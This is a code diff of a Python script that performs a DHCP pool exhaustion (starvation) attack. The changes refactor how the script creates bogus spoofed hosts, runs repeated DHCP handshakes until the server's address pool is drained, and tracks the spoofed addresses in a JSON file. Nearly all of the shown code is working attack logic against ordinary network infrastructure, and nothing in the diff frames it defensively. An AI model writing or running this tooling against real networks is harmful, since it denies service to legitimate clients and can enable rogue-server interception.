@@ -19,7 +19,7 @@ from utils import setup_logging, write_to_log, file_semaphore
 
 #### CONFIG #### -------------------------------------------------------------------
 timeout_to_receive_dhcp_response = 10 # Time to wait until non response is decided
-unanswered_discovers_to_conclude_exhaustion = 3
+max_failed_attempts_to_conclude_exhaustion = 3
 catch_and_release = False # Debug mode. Pool exhaustion + save results + Load results + Release + Save results
 
 base_dir = Path(__file__).resolve().parent
@@ -30,10 +30,11 @@ setup_logging(log_file)
 
 #### FUNCTIONS #### ----------------------------------------------------------------
 
-def check_if_spoof_is_needed(available_hosts, network):
+def is_pool_exhaustion_needed(available_hosts, network):
+#def is_pool_exhaustion_needed(network):
     """
     Decide if a spoof is needed for every available IP address on the network.
-    Retuns a list of IP addresses to be spoofed.
+    Retuns True if not all IP addresses on network are spoofed
     """
 
     write_to_log(f"Checking if host spoof is expired")
@@ -49,12 +50,11 @@ def check_if_spoof_is_needed(available_hosts, network):
         write_to_log(f"An unexpected error occurred: {str(e)}")
         spoofed_ip_dict = {}
 
-    # Return all IP addresses if something goes wrong
+    # Return True if something goes wrong
     if not spoofed_ip_dict:
         write_to_log(f"Trying to spoof all available IP addresses on network")
-        return available_hosts
+        return True
 
-    
     # Check if previous results belong to the same network
     if not ips_in_same_network(spoofed_ip_dict.keys(), network):
         # If not, flush JSON file and spoof all addresses
@@ -89,10 +89,10 @@ def check_if_spoof_is_needed(available_hosts, network):
 
         write_to_log(f"Previous results' network changed. Trying to spoof all available IP addresses on actual network")
 
-        return available_hosts
+        return True
     
     try:
-
+        # Remove outdated bogus host from dictionary and save changed to JSON file
         clean_host_dict = remove_expired_spoofed_hosts(spoofed_ip_dict)
         try:
             save_to_json(clean_host_dict, json_file, file_semaphore)
@@ -105,17 +105,17 @@ def check_if_spoof_is_needed(available_hosts, network):
 
         # Removing already spoofed addresses from all available IP addresses list 
         available_hosts[:] = [ip for ip in available_hosts if ip not in clean_host_dict]
-        
-        # Removing our own IP address from spoofing
-        available_hosts.remove(our_ip_address)
+
+        # If remaining addresses to spoof are router/DHCP Server and our own device
+        if len(available_hosts) <= 2:
+            # All possible addresses on network are spoofed. There's no need to perform a pool exhaustion
+            return False
 
     except Exception as e:
 
         write_to_log(f"Error during spoof need checking: {e}")
-
-    finally:
-
-        return available_hosts
+    
+    return True
 
 
 def remove_expired_spoofed_hosts(host_dict):
@@ -126,11 +126,7 @@ def remove_expired_spoofed_hosts(host_dict):
     addresses_with_expired_spoof = []
     # Check if spoof is out-to-date by comparing acquisition time with lease renewal time
     for ip, host in host_dict.items():
-        '''
-        # If it's router/DHCP server, ignore it
-        if host.is_server:
-            pass
-        '''
+
         # Comparing acquisition time to time now
         time_diff = (time_now - host.acquisition_time).total_seconds()
         if time_diff > host.lease_time or not host.is_spoofed:
@@ -202,28 +198,25 @@ def pool_exhaustion_with_request(ip_list):
 '''
 
 
-def pool_exhaustion_with_discover(number):
+def pool_exhaustion_with_discover(timeout, max_failed_attempts):
     """
-    Perform a complete DORA handshake "number" times
+    Perform a complete DORA handshake.
     """
-
     spoofed_ips_counter = 0
-    unanswered_counter = 0
+    failed_attempts = 0
 
-    for _ in range(number):
+    while failed_attempts < max_failed_attempts:
+    #for _ in range(number):
         # Create a new bogus host
         host = fake_host.create_host()
 
         # Perform DORA handshake to obtain an IP address
-        acquisition_successfull = perform_dhcp_discover_offer(host, timeout_to_receive_dhcp_response)
+        acquisition_successfull = perform_dhcp_discover_offer(host, timeout)
 
         if acquisition_successfull:
             spoofed_ips_counter += 1
         else:
-            unanswered_counter += 1
-
-        if unanswered_counter >= unanswered_discovers_to_conclude_exhaustion:
-            break
+            failed_attempts += 1
 
     return spoofed_ips_counter
 
@@ -381,7 +374,7 @@ def main():
     # Getting all host avalaible IP addresses for network
     available_hosts = get_hosts_from_network(our_ip_address, our_netmask)
     # Check previous spoofed host in json file to decide if pool exhaustion is needed for every existing ip address on network
-    ip_list_to_spoof = check_if_spoof_is_needed(available_hosts, our_network)
+    # = is_pool_exhaustion_needed(available_hosts, our_network)
 
     
     # Starting response DHCP packet capture thread
@@ -391,6 +384,18 @@ def main():
 
     # Pool exhaustion: getting all avalaible IP from DHCP server's pool
     try:
+        # Check previous spoofed host in json file to decide if pool exhaustion is needed for every existing ip address on network
+        if is_pool_exhaustion_needed(available_hosts, our_network):
+
+            write_to_log(f"Starting DHCP Discover pool exhaustion")
+
+            spoofed_ips_counter = pool_exhaustion_with_discover(timeout_to_receive_dhcp_response, max_failed_attempts_to_conclude_exhaustion)
+            write_to_log(f"Pool exhaustion completed with a total of {spoofed_ips_counter} IP addresses acquired")
+
+        else:
+
+            write_to_log(f"All IP addresses existent on network are spoofed. There's no need to perform a pool exhaustion.")
+
         '''
         write_to_log(f"Starting DHCP Request pool exhaustion")
         spoofed_ips_counter = pool_exhaustion_with_request(ip_list_to_spoof)
@@ -401,12 +406,7 @@ def main():
             spoofed_ips_counter = pool_exhaustion_with_discover(len(ip_list_to_spoof))
             write_to_log(f"DHCP Discover exhaustion completed with a total of {spoofed_ips_counter} IP addresses acquired")
         '''
-        write_to_log(f"Starting DHCP Discover pool exhaustion")
-        spoofed_ips_counter = pool_exhaustion_with_discover(len(ip_list_to_spoof))
-        write_to_log(f"DHCP Discover exhaustion completed with a total of {spoofed_ips_counter} IP addresses acquired")
         
-        
-        write_to_log(f"Pool exhaustion completed")
 
         # If True: releases all ip addresses 
         if catch_and_release:
